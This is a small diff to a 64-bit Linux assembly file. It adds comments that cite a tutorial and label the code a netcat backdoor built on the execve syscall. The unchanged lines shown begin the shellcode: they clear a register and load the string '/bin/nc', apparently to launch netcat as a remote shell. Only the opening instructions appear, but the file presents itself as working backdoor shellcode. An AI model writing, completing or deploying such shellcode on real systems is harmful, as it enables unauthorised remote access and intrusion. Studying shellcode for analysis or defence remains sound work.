@@ -1,3 +1,5 @@
+; article : http://chmodsecurity.com.br/artigo/23/writing-backdoor-in-asm-linux-64-bits-sycall-netcat.html
+; backdoor netcat execve() sycall 59 linux _64
 BITS 64
 xor    	rdx,rdx ; zerando rdx
 mov 	rdi,0x636e2f6e69622fff ; string /bin/nc
